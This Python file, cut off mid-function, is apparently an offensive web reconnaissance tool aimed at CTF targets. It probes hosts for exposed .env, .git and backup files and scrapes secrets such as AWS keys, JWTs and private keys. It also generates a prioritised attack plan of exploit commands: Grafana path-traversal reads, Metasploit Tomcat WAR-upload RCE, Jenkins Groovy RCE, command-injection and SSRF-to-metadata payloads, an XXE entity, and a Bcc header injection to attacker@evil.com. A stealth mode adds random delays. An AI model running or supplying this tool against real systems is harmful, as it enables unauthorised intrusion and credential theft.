import sys
import os
import re
import math
import json
import time
import random
import argparse
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from collections import defaultdict, Counter
from urllib.parse import urlparse, urljoin, parse_qs
from urllib3.exceptions import InsecureRequestWarning
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
from rich import box
from rich.markup import escape
from concurrent.futures import ThreadPoolExecutor, as_completed

# Suppress warnings
urllib3.disable_warnings(category=InsecureRequestWarning)

console = Console()

# --- VULNERABILITY KNOWLEDGE BASE ---
VULN_KB = {
    "Request Baskets SSRF": {
        "patterns": [r"request baskets", r"baskets"],
        "vuln": "🎯 SSRF (CVE-2023-27163)",
        "desc": "Baskets <= 1.2.1 permiten SSRF mediante /api/baskets/{name}. Redirige el tráfico a servicios internos.",
        "exploit": "Crea Basket -> Configura forward_url=http://127.0.0.1:80 -> Accede al Basket.",
        "color": "bold red"
    },
    "Spring Boot Actuator": {
        "patterns": [r"\"_links\":\s*\{\s*\"self\"", r"\"status\":\s*\"UP\""],
        "vuln": "🌱 Spring Boot Actuator Expuesto",
        "desc": "Puede filtrar variables de entorno, credenciales o permitir RCE via /env o /heapdump.",
        "exploit": "Revisar /actuator/env, /actuator/sessions, o buscar RCE via Jolokia/H2.",
        "color": "bold green"
    },
    "Laravel Debug Mode": {
        "patterns": [r"Whoops, looks like something went wrong", r"Laravel[\\/]Framework[\\/]"],
        "vuln": "🐘 Laravel Debug Mode / Ignition",
        "desc": "Modo debug activado. Puede exponer .env (APP_KEY, DB_PASSWORD) o permitir RCE (CVE-2021-3129).",
        "exploit": "Buscar pestaña 'Environment' o explotar Ignition RCE.",
        "color": "bold magenta"
    },
    "Werkzeug Console": {
        "patterns": [r"Werkzeug powered traceback interpreter", r"console\.js"],
        "vuln": "🐍 Werkzeug Console / Debugger",
        "desc": "Consola interactiva de Python expuesta. RCE inminente si no tiene PIN o si se puede predecir.",
        "exploit": "Intentar comandos python o predecir el PIN filtrando /etc/machine-id.",
        "color": "bold yellow"
    },
    "Git Repository": {
        "patterns": [r"\[core\]\s*repositoryformatversion", r"bare\s*=\s*(true|false)"],
        "vuln": "📁 Repositorio Git Expuesto (.git/config)",
        "desc": "Acceso a la configuración y posiblemente al código fuente completo del servidor.",
        "exploit": "Usar git-dumper para extraer todo el código y buscar credenciales cacheadas.",
        "color": "bold white"
    },
    # --- NEW: Tomcat Manager detection ---
    "Tomcat Manager": {
        "patterns": [r"Apache Tomcat", r"manager/html"],
        "vuln": "🔴 Tomcat Manager Exposed",
        "desc": "Tomcat Manager interfaz expuesta. Credenciales por defecto frecuentes: tomcat:tomcat, admin:admin, tomcat:s3cret.",
        "exploit": "Probar credenciales por defecto (tomcat:tomcat, admin:admin). Si accedes, deploy WAR malicioso o usa msfconsole: exploit/multi/http/tomcat_mgr_upload.",
        "color": "bold red"
    },
    # --- NEW: Grafana LFI ---
    "Grafana": {
        "patterns": [r"Grafana", r"grafana-app"],
        "vuln": "📊 Grafana Instance",
        "desc": "Grafana detectado. Versiones < 8.3.0 son vulnerables a LFI (CVE-2021-43798) que permite leer archivos arbitrarios del servidor.",
        "exploit": "LFI: curl --path-as-is 'http://<target>:<port>/public/plugins/alertlist/../../../../etc/passwd'. También probar /api/datasources para credenciales de BD.",
        "color": "bold yellow"
    },
    # --- NEW: Jenkins Script Console RCE ---
    "Jenkins": {
        "patterns": [r"Dashboard \[Jenkins\]", r"Jenkins\.instance"],
        "vuln": "🔧 Jenkins Exposed",
        "desc": "Jenkins detectado. Si la Script Console está abierta (/script), permite ejecución Groovy = RCE directo. También revisar /credentials/ y builds.",
        "exploit": "Acceder a /script para Groovy RCE: println 'id'.execute().text. Revisar /credentials/ y /asynchPeople/ para usuarios.",
        "color": "bold red"
    },
    # --- NEW: phpMyAdmin ---
    "phpMyAdmin": {
        "patterns": [r"phpMyAdmin", r"pma_console"],
        "vuln": "🗄️ phpMyAdmin",
        "desc": "phpMyAdmin expuesto. Verificar versión para CVEs específicos (e.g. CVE-2018-12613 LFI en < 4.8.2). Probar credenciales por defecto.",
        "exploit": "Identificar versión y buscar: searchsploit phpMyAdmin. Probar root sin password o credenciales comunes.",
        "color": "bold magenta"
    },
    # --- NEW: WordPress ---
    "WordPress": {
        "patterns": [r"wp-content", r"wp-includes", r"WordPress"],
        "vuln": "📝 WordPress Detected",
        "desc": "WordPress detectado. Superficie de ataque amplia: plugins vulnerables, usuarios enumerables, XML-RPC, REST API.",
        "exploit": "wpscan --url <target> --enumerate u,p,t,vp --api-token <token>. También revisar /wp-json/wp/v2/users y /xmlrpc.php.",
        "color": "bold blue"
    },
    # --- NEW: Joomla ---
    "Joomla": {
        "patterns": [r"Joomla!", r"/administrator/"],
        "vuln": "🏗️ Joomla Detected",
        "desc": "Joomla detectado. Revisar versión en /administrator/manifests/files/joomla.xml. Muchos CVEs históricos (e.g. CVE-2023-23752 info disclosure).",
        "exploit": "joomscan -u <target>. Revisar /configuration.php~, /configuration.php.bak para credenciales filtradas.",
        "color": "bold cyan"
    },
    # --- NEW: Drupal ---
    "Drupal": {
        "patterns": [r"Drupal\.settings", r"drupal\.js"],
        "vuln": "💧 Drupal Detected",
        "desc": "Drupal detectado. Versiones 7.x < 7.58 y 8.x < 8.3.9 vulnerables a Drupalgeddon (CVE-2018-7600) = RCE sin auth.",
        "exploit": "searchsploit drupalgeddon. Revisar /CHANGELOG.txt para versión exacta. python3 drupalgeddon2.py <target>.",
        "color": "bold green"
    },
}

# --- VERSION & METADATA ---
VERSION = "8.0"
CODENAME = "ACTIVE RECON SENTIENCE"
USER_AGENT = f"PhantomRecon-WebInspector/{VERSION}"
MAX_THREADS = 50  # Turbocharged for CTF

# --- KNOWN VULNERABLE VERSIONS: flag critical versions in Server/X-Powered-By ---
# Maps (software_name_lowercase, version_prefix) → CVE / description
KNOWN_VULN_VERSIONS = {
    ("apache", "2.4.49"): "CVE-2021-41773 — Path Traversal / RCE",
    ("apache", "2.4.50"): "CVE-2021-42013 — Path Traversal / RCE (bypass of 2.4.49 fix)",
    ("apache", "2.4.7"):  "CVE-2017-15715 — File upload bypass via trailing newline",
    ("nginx", "1.4.6"):   "Old nginx — check for alias traversal & off-by-slash",
    ("nginx", "1.6.2"):   "Old nginx — check for alias traversal & off-by-slash",
    ("openssh", "7.2"):   "CVE-2016-6210 — User enumeration timing attack",
    ("openssh", "8.2"):   "Check for CVE-2020-15778 scp command injection",
    ("php", "7.4.3"):     "End-of-life — múltiples CVEs sin parche",
    ("php", "5."):        "PHP 5.x — end-of-life, crítico",
    ("php", "8.1.0"):     "CVE-2024-4577 — CGI argument injection on Windows",
    ("tomcat", "9.0.30"): "CVE-2020-1938 — Ghostcat AJP",
    ("tomcat", "8.5.19"): "CVE-2017-12615 — PUT method RCE",
    ("iis", "6.0"):       "CVE-2017-7269 — Buffer overflow WebDAV RCE",
    ("iis", "7.5"):       "Legacy — check for tilde enumeration",
    ("werkzeug", "1."):   "Older Werkzeug — debugger PIN puede ser predecible",
    ("express", "4.17.1"): "Check for prototype pollution in dependencies",
}

# --- ACTIVE RECON: rutas de alto valor a sondear en cada origen descubierto ---
HIGH_VALUE_PATHS = (
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".env", ".env.bak",
    ".DS_Store", ".htaccess", ".htpasswd", "composer.json", "package.json",
    "yarn.lock", "Dockerfile", "docker-compose.yml", "phpinfo.php", "info.php",
    "server-status", "server-info", ".well-known/security.txt", "swagger.json",
    "openapi.json", "api-docs", "api/docs", "actuator", "actuator/env",
    "actuator/health", "actuator/heapdump", "console", "wp-login.php",
    "wp-config.php.bak", "config.php.bak", "config.json", "backup.zip",
    "backup.tar.gz", "db.sql", "dump.sql", "metrics", "graphql", "admin", "login",
    # --- NEW: additional high-value paths for CMS/CI/CD/config discovery ---
    "manager/html",                  # Tomcat Manager
    "wp-json/wp/v2/users",           # WordPress REST API user enum
    "wp-json",                       # WordPress REST API root
    "xmlrpc.php",                    # WordPress XML-RPC (bruteforce/SSRF)
    "_debug",                        # Symfony debug toolbar
    "debug/default/view",            # Yii2 debug module
    "elmah.axd",                     # ASP.NET error log viewer
    "trace.axd",                     # ASP.NET trace viewer
    ".dockerignore",                 # Docker ignore (reveals project structure)
    "Makefile",                      # Build system (reveals targets/paths)
    "requirements.txt",              # Python dependencies (version intel)
    "Gemfile",                       # Ruby dependencies
    "Pipfile",                       # Python Pipenv dependencies
    "pom.xml",                       # Java Maven config (internal repos/deps)
    "web.config",                    # IIS/ASP.NET config (connection strings)
    "crossdomain.xml",               # Flash cross-domain policy (trust pivots)
    "clientaccesspolicy.xml",        # Silverlight cross-domain policy
)

# Ficheros cuya exposición (HTTP 200) es crítica de por sí.
SENSITIVE_FILES = (
    ".git/head", ".git/config", ".env", ".ds_store", ".htpasswd", ".htaccess",
    "wp-config.php", "composer.json", "package.json", "swagger.json",
    "openapi.json", "actuator/env", "actuator/heapdump", "phpinfo.php",
    ".bak", ".sql", ".old", ".swp", "~",
)

# --- INJECTION PARAMETER HEURISTICS (razona sobre el nombre del parámetro) ---
PARAM_VULN_HINTS = (
    ({"file", "filename", "filepath", "path", "page", "include", "inc", "doc",
      "document", "folder", "root", "pg", "style", "lang", "download", "read",
      "load", "content", "log", "conf", "config"}, "🕳️ LFI / Path Traversal"),
    ({"id", "uid", "pid", "cat", "category", "item", "product", "prod", "user",
      "order", "sort", "col", "table", "search", "q", "filter", "name", "email"},
     "💉 SQL Injection"),
    ({"cmd", "exec", "command", "run", "ping", "code", "do", "func", "call",
      "ip", "host", "system", "shell"}, "🔥 Command Injection / RCE"),
    ({"url", "redirect", "redir", "next", "return", "returnurl", "dest",
      "destination", "continue", "target", "link", "uri", "callback", "domain",
      "site", "out", "to", "feed", "image_url", "imageurl", "fetch", "proxy"},
     "🎯 SSRF / Open Redirect"),
    ({"tpl", "template", "preview", "render", "twig", "view"},
     "🧨 SSTI (Template Injection)"),
    # --- NEW: XXE / XML Injection parameter heuristics ---
    ({"xml", "data", "payload", "body", "soap", "wsdl"},
     "🧨 XXE / XML Injection"),
    # --- NEW: Email Injection / Header Injection parameter heuristics ---
    ({"email", "to", "from", "subject", "cc", "bcc"},
     "📧 Email Injection / Header Injection"),
)

# --- ROBUST SESSION CONFIG ---
def get_session():
    session = requests.Session()
    retry = Retry(total=3, connect=2, read=2, backoff_factor=0.2,
                  status_forcelist=[502, 503, 504], raise_on_status=False)
    adapter = HTTPAdapter(max_retries=retry, pool_connections=MAX_THREADS, pool_maxsize=MAX_THREADS)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

# --- DEEP HEURISTICS ENGINE ---
def calculate_entropy(data):
    if not data: return 0
    n = len(data)
    # Counter en O(n) en vez de data.count(x) por carácter (O(n²) en cuerpos grandes)
    return -sum((c / n) * math.log(c / n, 2) for c in Counter(data).values())

def is_boring_asset(url_or_path):
    # .js is intentionally EXCLUDED from boring assets because it holds huge CTF value (secrets, API paths)
    boring_exts = ('.css', '.jpg', '.jpeg', '.png', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf', '.eot', '.mp4', '.avi', '.mp3', '.pdf', '.css.map')
    boring_paths = ('node_modules/', 'bower_components/', 'vendor/', 'bootstrap/', 'jquery/', 'assets/images/', 'assets/fonts/')
    # Strip query/fragment so 'logo.png?v=2' or 'app.css#x' are still recognised as static.
    text = url_or_path.lower().split('?', 1)[0].split('#', 1)[0]
    return text.endswith(boring_exts) or any(bp in text for bp in boring_paths)

# --- EXPANDED HIGH-FIDELITY REGEX SUITE ---
REGEX_SUITE = {
    "🔥 CRITICAL SECRETS": [
        (r"(?i)(eyJhbGciOi[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+?\.[a-zA-Z0-9_-]+)", "🔑 JWT Token", lambda x: True),
        (r"(?i)(AKIA[0-9A-Z]{16})", "☁️ AWS Access Key", lambda x: True),
        (r"(?i)(-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----)", "🔐 Private Key", lambda x: True),
        (r"(?i)(ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9]{82})", "🐙 GitHub Token", lambda x: True),
        (r"(?i)xox[baprs]-[0-9]{12}-[0-9]{12}-[a-zA-Z0-9]{24}", "💬 Slack Token", lambda x: True),
        (r"(?i)[a-zA-Z0-9_-]+\.s3\.amazonaws\.com", "🪣 AWS S3 Bucket", lambda x: True),
    ],
    "👤 IDENTITIES": [
        (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "📧 Email", lambda x: not any(noise in x.lower() for noise in ["example.com", "test.com", "yopmail.com", "sentry.io"])),
        (r"(?i)(?:user|username|login|admin)\s*[:=]\s*[\"']([a-zA-Z0-9_-]{3,20})[\"']", "👤 Username", lambda x: x.lower() not in ['admin', 'root', 'user', 'test', 'username'])
    ],
    "📡 INFRASTRUCTURE": [
        (r"\b(?:10(?:\.[0-9]{1,3}){3}|172\.(?:1[6-9]|2[0-9]|3[01])(?:\.[0-9]{1,3}){2}|192\.168(?:\.[0-9]{1,3}){2})\b", "🗺️ Internal IP", lambda x: x not in ["127.0.0.1", "0.0.0.0"]),
        (r"s3\.amazonaws\.com/[a-zA-Z0-9._-]+|[a-zA-Z0-9._-]+\.s3\.amazonaws\.com", "🪣 AWS S3 Bucket", lambda x: True),
        (r"(?<![a-zA-Z0-9])([a-zA-Z0-9.-]{3,}\.(?:internal|local|lan|corp|stg|dev|htb|thm))(?![a-zA-Z0-9])", "🏠 Subdomain / Local", lambda x: len(x.split(".")[0]) > 2)
    ],
    # --- NEW: GraphQL introspection endpoint detection in ATTACK SURFACE ---
    "🗺️ ATTACK SURFACE": [
        (r"graphql|__schema|__typename|query\s*\{", "🔮 GraphQL Endpoint", lambda x: True),
    ],
}

def analyze_comments_and_js(body):
    hints = set()
    endpoints = set()
    
    # Comments extraction
    comments = re.findall(r"<!--\s*(.*?)\s*-->|/\*[\s\S]*?\*/|//\s*(.*)", body)
    high_value_words = ['todo', 'fixme', 'admin', 'password', 'debug', 'config', 'root', 'bypass', 'hack', 'test', 'dev', 'temp', 'legacy']
    for c1, c2 in comments:
        c = (c1 or c2).strip()
        if not c or len(c) > 300 or is_boring_asset(c): continue
        lower_c = c.lower()
        if any(hw in lower_c for hw in high_value_words):
            hints.add(f"🚨 {c}")
        elif len(c) > 15 and not any(noise in lower_c for noise in ['copyright', 'license', 'jquery', 'bootstrap', 'webpack', 'eslint']):
            hints.add(f"💬 {c}")
            
    # JS specific Endpoint Extraction (LinkFinder-style Regex)
    regex_str = r"""(?:"|')(((?:[a-zA-Z]{1,10}://|//)[^"'/]{1,}\.[a-zA-Z]{2,}[^"']{0,})|((?:/|\.\./|\./)[^"'><,;|*()(%%$^/\\\[\]][^"'><,;|()]{1,})|([a-zA-Z0-9_\-/]{1,}/[a-zA-Z0-9_\-/]{1,}\.(?:[a-zA-Z]{1,4}|action)(?:[\?|#][^"|']{0,}|))|([a-zA-Z0-9_\-/]{1,}/[a-zA-Z0-9_\-/]{3,}(?:[\?|#][^"|']{0,}|))|([a-zA-Z0-9_\-]{1,}\.(?:php|asp|aspx|jsp|json|action|html|js|txt|xml)(?:[\?|#][^"|']{0,}|)))(?:"|')"""
    js_paths = re.findall(regex_str, body)
    for group in js_paths:
        p = next((g for g in group if g), "") # Get the first non-empty match from the tuple
        if p and not is_boring_asset(p) and not p.startswith("http://www.w3.org") and len(p) > 4:
            endpoints.add(f"🚀 {p}")
            
    return hints, endpoints

# Cabeceras que delatan tecnología, versiones o superficie de ataque.
INTERESTING_HEADERS = (
    "server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
    "x-generator", "x-drupal-cache", "x-runtime", "via", "x-backend-server",
    "www-authenticate", "x-debug-token", "x-debug-token-link",
)
# Marcador en Set-Cookie -> stack inferido (sesión = pista directa del framework).
COOKIE_TECH = {
    "phpsessid": "PHP", "jsessionid": "Java / Tomcat", "laravel_session": "Laravel",
    "connect.sid": "Node.js / Express", "csrftoken": "Django", "sessionid": "Django",
    "_rails": "Ruby on Rails", "asp.net_sessionid": "ASP.NET", ".aspxauth": "ASP.NET",
    "wordpress_": "WordPress", "wp-": "WordPress", "ci_session": "CodeIgniter",
    "symfony": "Symfony", "express:sess": "Node.js / Express",
    # --- NEW: additional cookie-to-technology fingerprints ---
    "grafana_session": "Grafana",
    "xsrf-token": "Laravel / Angular",
    "rack.session": "Ruby / Rack",
    "_gorilla_csrf": "Go (Gorilla)",
}


def _extract_version(header_value):
    """Extract version number from a Server or X-Powered-By header value.

    Examples:
        'Apache/2.4.49 (Ubuntu)' → ('Apache', '2.4.49')
        'PHP/7.4.3'              → ('PHP', '7.4.3')
        'nginx/1.18.0'           → ('nginx', '1.18.0')
        'Microsoft-IIS/10.0'     → ('Microsoft-IIS', '10.0')
    Returns (software, version) or (None, None) if no version pattern found.
    """
    m = re.search(r"([A-Za-z][A-Za-z0-9._-]*)/(\d+\.\d+(?:\.\d+)*)", header_value)
    if m:
        return m.group(1), m.group(2)
    return None, None


def _check_known_vuln_version(software, version):
    """Check extracted version against KNOWN_VULN_VERSIONS database.

    Performs both exact match and prefix match (for entries like 'php', '5.')
    so that PHP/5.6.40 matches the ('php', '5.') rule.
    Returns list of warning strings.
    """
    warnings = []
    sw_lower = software.lower()
    for (kb_sw, kb_ver), cve_desc in KNOWN_VULN_VERSIONS.items():
        if kb_sw in sw_lower and version.startswith(kb_ver):
            warnings.append(f"⚠️ {software}/{version} → {cve_desc}")
    return warnings


def analyze_headers(resp):
    """Extrae inteligencia de las cabeceras de respuesta (fingerprint de stack)."""
    out = set()
    h = resp.headers  # CaseInsensitiveDict -> lookups case-insensitive
    for name in INTERESTING_HEADERS:
        val = h.get(name)
        if val:
            out.add(f"🧰 {name.title()}: {val}")
            # --- NEW: version extraction + known-vuln check for key headers ---
            if name in ("server", "x-powered-by"):
                sw, ver = _extract_version(val)
                if sw and ver:
                    out.add(f"🔖 Version: {sw} {ver}")
                    for warning in _check_known_vuln_version(sw, ver):
                        out.add(warning)

    cookies = h.get("set-cookie", "").lower()
    for marker, tech in COOKIE_TECH.items():
        if marker in cookies:
            out.add(f"🍪 Cookie '{marker}' → {tech}")

    # Redirección: el destino suele revelar vhost/dominio interno.
    if resp.history:
        loc = resp.url
        if loc:
            out.add(f"↪️ Redirige a: {loc}")
    return out

def analyze_forms(body):
    forms = set()
    hiddens = re.findall(r"<input[^>]+type=[\"']hidden[\"'][^>]+name=[\"']([^\"']+)[\"'][^>]*value=[\"']([^\"']*)[\"']", body, re.IGNORECASE)
    for name, value in hiddens:
        forms.add(f"🕵️ Hidden: {name}='{value}'")
    actions = re.findall(r"<form[^>]+action=[\"']([^\"']+)[\"'][^>]*>", body, re.IGNORECASE)
    for act in actions:
        if not is_boring_asset(act) and len(act) > 1:
            forms.add(f"📝 Form Action: {act}")
    return forms

def analyze_url_params(url):
    """Clasifica los parámetros de la query según su vector de inyección probable."""
    out = set()
    try:
        query = urlparse(url).query
    except Exception:
        return out
    if not query:
        return out
    for pname in parse_qs(query, keep_blank_values=True):
        pl = pname.lower()
        for names, label in PARAM_VULN_HINTS:
            if pl in names:
                out.add(f"{label}: ?{pname}=")
    return out


def analyze_sensitive_exposure(url, resp):
    """Marca como crítico un fichero sensible que responde 200 con contenido real."""
    out = []
    try:
        path = urlparse(url).path.lower()
    except Exception:
        return out
    if resp.status_code != 200:
        return out
    if any(path.endswith(s) or s in path for s in SENSITIVE_FILES):
        ctype = resp.headers.get("content-type", "").lower()
        # Validación de falsos positivos (Soft 404s)
        if "html" in ctype and len(resp.text) > 4000:
            return out
            
        body_lower = resp.text.lower()
        # Validaciones de contenido estricto para evitar 200 falsos
        if ".env" in path and not any(k in body_lower for k in ["app_env", "db_host", "app_key", "secret"]):
            return out
        if ".git/config" in path and "[core]" not in body_lower:
            return out
            
        out.append(f"🚨 Fichero sensible expuesto: {url} [{resp.status_code}]")
    return out


def origins_from_urls(urls):
    """Deriva orígenes únicos (scheme://host:port) del conjunto de URLs."""
    origins = set()
    for u in urls:
        try:
            p = urlparse(u)
            if p.scheme and p.netloc:
                origins.add(f"{p.scheme}://{p.netloc}")
        except Exception:
            continue
    return sorted(origins)


def seed_recon(origins, session):
    """Recon activo por origen: robots.txt + sitemap.xml + rutas de alto valor.

    Devuelve (extra_urls, robots_hints). Las URLs sembradas se inspeccionan luego
    por el mismo motor (que filtra los 404), así que aquí solo descubrimos.
    """
    extra = set()
    hints = []
    hdrs = {"User-Agent": USER_AGENT}
    for origin in origins:
        base = origin + "/"
        # robots.txt -> Disallow/Allow/Sitemap son pistas directas de rutas ocultas.
        try:
            r = session.get(urljoin(base, "robots.txt"), headers=hdrs, verify=False, timeout=6)
            if r.status_code == 200 and "<html" not in r.text.lower():
                for line in r.text.splitlines():
                    m = re.match(r"\s*(?:dis)?allow\s*:\s*(\S+)", line, re.I)
                    if m and m.group(1) not in ("/", "*"):
                        extra.add(urljoin(base, m.group(1).lstrip("/")))
                        hints.append(f"🤖 {m.group(1)}")
                    sm = re.match(r"\s*sitemap\s*:\s*(\S+)", line, re.I)
                    if sm:
                        extra.add(sm.group(1))
        except Exception:
            pass
        # sitemap.xml -> <loc> entries.
        try:
            r = session.get(urljoin(base, "sitemap.xml"), headers=hdrs, verify=False, timeout=6)
            if r.status_code == 200:
                for loc in re.findall(r"<loc>\s*([^<\s]+)\s*</loc>", r.text, re.I):
                    extra.add(loc)
        except Exception:
            pass
        # Rutas curadas de alto valor (el motor las sondea y descarta los 404).
        for path in HIGH_VALUE_PATHS:
            extra.add(urljoin(base, path))
    return extra, hints


def detect_dir_listing(body):
    """Detecta un listado de directorio abierto (Apache/nginx/IIS autoindex)."""
    head = body[:2048]
    return bool(re.search(r"<title>Index of /|Directory listing for|"
                          r"\[To Parent Directory\]|<h1>Index of /", head, re.IGNORECASE))


def threat_panels(kb_names):
    """Reconstruye los paneles de threat-intel a partir de los nombres ya detectados."""
    panels = []
    for name in kb_names:
        info = VULN_KB.get(name)
        if not info:
            continue
        panels.append(Panel(
            f"[bold]Detected:[/bold] {name}\n[bold]Vuln:[/bold] {info['vuln']}\n"
            f"[bold]Info:[/bold] {info['desc']}\n[bold]Exploit:[/bold] {info.get('exploit', 'N/A')}",
            title="🔍 THREAT INTEL MATRIX", border_style=info["color"], expand=True))
    return panels


def _origin(url):
    try:
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"
    except Exception:
        return url


def build_triage(results):
    """Sintetiza TODOS los hallazgos en un plan de ataque priorizado y accionable.

    Devuelve lista ordenada de (prioridad, texto-con-comando). Prioridad 0 = máxima.
    Esto es lo que ninguna otra herramienta de la cadena hace: razonar sobre el
    conjunto y decir 'ataca esto primero, con este comando'.
    """
    actions, seen = [], set()
    def add(prio, text):
        if text not in seen:
            seen.add(text)
            actions.append((prio, text))

    for r in results:
        url = r.get("url", "")
        f = r.get("findings", {})

        # --- Ficheros sensibles / secretos (prioridad máxima) ---
        for item in f.get("🔥 CRITICAL SECRETS", []):
            low = item.lower()
            if "fichero sensible" in low and ".git" in low:
                add(0, f"git-dumper '{_origin(url)}/.git/' ./git_loot   # repo .git expuesto → código fuente + credenciales")
            elif "fichero sensible" in low and ".env" in low:
                add(0, f"curl -s '{url}'   # .env expuesto → APP_KEY / DB_PASSWORD / secretos")
            elif "fichero sensible" in low:
                add(1, f"Descargar fichero sensible: {url}")
            elif "private key" in low:
                add(0, f"Clave privada filtrada en {url} → usar para SSH/descifrado")
            elif "database uri" in low:
                add(1, f"Credenciales de BD en {url}: {item.split(': ',1)[-1]}")
            elif "password" in low or "api/token" in low or "jwt" in low:
                add(1, f"Probar secreto de {url}: {item.split(': ',1)[-1]}")

        # --- Inyecciones: comando exacto por vector ---
        for item in f.get("🎯 INJECTION CANDIDATES", []):
            param = item.split("?", 1)[-1].rstrip("=") if "?" in item else "?"
            if "LFI" in item:
                add(2, f"LFI en {url} (param '{param}'): curl '{url}' → prueba {param}=../../../../etc/passwd y filtros php://")
            elif "SQL" in item:
                add(2, f"SQLi en {url} (param '{param}'): sqlmap -u '{url}' -p {param} --batch --dbs")
            elif "RCE" in item or "Command" in item:
                add(1, f"RCE/Cmd en {url} (param '{param}'): prueba {param}=;id  |id  $(id)  `id`")
            elif "SSRF" in item:
                add(2, f"SSRF/Redirect en {url} (param '{param}'): apunta {param} a http://127.0.0.1 / http://169.254.169.254/latest/meta-data/")
            elif "SSTI" in item:
                add(2, f"SSTI en {url} (param '{param}'): prueba {param}={{{{7*7}}}} (Jinja2) o ${{7*7}} (Twig/FreeMarker) → busca 49")
            # --- NEW: XXE injection triage action ---
            elif "XXE" in item:
                add(2, f"XXE en {url} (param '{param}'): enviar payload XML con <!ENTITY xxe SYSTEM 'file:///etc/passwd'>")
            # --- NEW: Email injection triage action ---
            elif "Email" in item:
                add(3, f"Email Injection en {url} (param '{param}'): prueba {param}=test%0aBcc:attacker@evil.com")

        # --- Threat intel (exploits conocidos) ---
        for name in r.get("kb", []):
            info = VULN_KB.get(name, {})
            add(0, f"{info.get('vuln', name)} en {url} → {info.get('exploit', '')}")

        # --- NEW: CMS-specific triage actions based on KB detections ---
        kb_names = set(r.get("kb", []))

        if "WordPress" in kb_names:
            origin = _origin(url)
            add(1, f"wpscan --url '{origin}/' --enumerate u,p,t,vp --api-token <WP_API_TOKEN>   # WordPress → plugins, temas, usuarios")
            add(2, f"curl -s '{origin}/wp-json/wp/v2/users' | jq   # WordPress user enumeration via REST API")
            add(2, f"Probar XML-RPC multicall bruteforce: {origin}/xmlrpc.php")
            add(1, f"nuclei -u '{origin}' -t http/vulnerabilities/wordpress,http/cves -severity critical,high")

        if "Tomcat Manager" in kb_names:
            origin = _origin(url)
            add(0, f"Probar credenciales Tomcat por defecto en {origin}/manager/html → tomcat:tomcat, admin:admin, tomcat:s3cret")
            add(1, f"msfconsole -q -x 'use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {origin}; run'   # WAR deploy RCE")
            add(1, f"nuclei -u '{origin}' -tags tomcat,cve -severity critical,high")

        if "Jenkins" in kb_names:
            origin = _origin(url)
            add(0, f"Acceder a {origin}/script → Groovy Console RCE: println 'id'.execute().text")
            add(1, f"Revisar {origin}/credentials/ y {origin}/asynchPeople/ para enumerar usuarios y secretos")

        if "Grafana" in kb_names:
            origin = _origin(url)
            add(1, f"curl --path-as-is '{origin}/public/plugins/alertlist/../../../../etc/passwd'   # Grafana LFI CVE-2021-43798")

        if "Joomla" in kb_names:
            origin = _origin(url)
            add(1, f"joomscan -u '{origin}'   # Joomla vulnerability scanner")
            add(1, f"nuclei -u '{origin}' -tags joomla,cve -severity critical,high")

        if "Drupal" in kb_names:
            origin = _origin(url)
            add(1, f"curl -s '{origin}/CHANGELOG.txt' | head -5   # Drupal version disclosure")
            add(1, f"searchsploit drupalgeddon   # Drupal RCE exploits")

        if "phpMyAdmin" in kb_names:
            origin = _origin(url)
            add(1, f"Probar {origin} con root:<blank> o root:root. searchsploit phpMyAdmin para CVEs")

        # --- Superficie ---
        for item in f.get("🗺️ ATTACK SURFACE", []):
            if "Directory Listing" in item:
                add(3, f"Navegar listado de directorio abierto: {url}")

        # --- Subdominios / vhosts ---
        for item in f.get("📡 INFRASTRUCTURE", []) + f.get("🗺️ ATTACK SURFACE", []):
            if "Subdomain" in item or "🏠" in item:
                host = item.split(": ", 1)[-1]
                add(2, f"Añadir a /etc/hosts y enumerar vhost: {host}")

    actions.sort(key=lambda x: x[0])
    return actions


def _export_markdown(report, output_path):
    """Export the report dict as a clean, readable Markdown file."""
    lines = []
    lines.append("# 🔍 PHANTOM WEB INSPECTOR — Report\n")
    lines.append(f"*Generated by Web Inspector v{VERSION} ({CODENAME})*\n")

    # --- Results ---
    results = report.get("results", [])
    if results:
        lines.append("## 📊 Findings\n")
        for r in results:
            url = r.get("url", "N/A")
            status = r.get("status", "?")
            findings = r.get("findings", {})
            kb = r.get("kb", [])
            # Skip entries with zero findings
            if not any(findings.values()) and not kb:
                continue
            lines.append(f"### `{url}` — HTTP {status}\n")
            # KB detections
            if kb:
                for name in kb:
                    info = VULN_KB.get(name, {})
                    lines.append(f"> **🔍 Threat Intel: {name}**  ")
                    lines.append(f"> Vuln: {info.get('vuln', 'N/A')}  ")
                    lines.append(f"> Info: {info.get('desc', '')}  ")
                    lines.append(f"> Exploit: {info.get('exploit', 'N/A')}\n")
            # Category findings
            for cat, items in findings.items():
                if not items:
                    continue
                lines.append(f"**{cat}**\n")
                for item in items:
                    lines.append(f"- {item}")
                lines.append("")  # blank line

    # --- Triage ---
    triage = report.get("triage", [])
    if triage:
        prio_label = {0: "🔴 CRÍTICO", 1: "🟠 ALTO", 2: "🟡 MEDIO", 3: "🔵 INFO"}
        lines.append("## 🎯 Plan de Ataque Sugerido\n")
        lines.append("| # | Prioridad | Acción |")
        lines.append("|---|-----------|--------|")
        for i, entry in enumerate(triage, 1):
            prio = entry.get("priority", 3)
            action = entry.get("action", "")
            tag = prio_label.get(prio, "INFO")
            # Escape pipe characters in action text for markdown table
            action_escaped = action.replace("|", "\\|")
            lines.append(f"| {i} | {tag} | {action_escaped} |")
        lines.append("")

    md_content = "\n".join(lines)
    with open(output_path, "w", encoding="utf-8") as f:
        f.write(md_content)
    return output_path


# --- Global stealth flag (set by CLI parser, consumed by inspect_target) ---
STEALTH_MODE = False


def inspect_target(url, session):
    if is_boring_asset(url):
        return None

    # --- NEW: stealth mode adds random delay between requests ---
    if STEALTH_MODE:
        time.sleep(random.uniform(0.5, 2.0))

    try:
        headers = {
            "User-Agent": USER_AGENT,
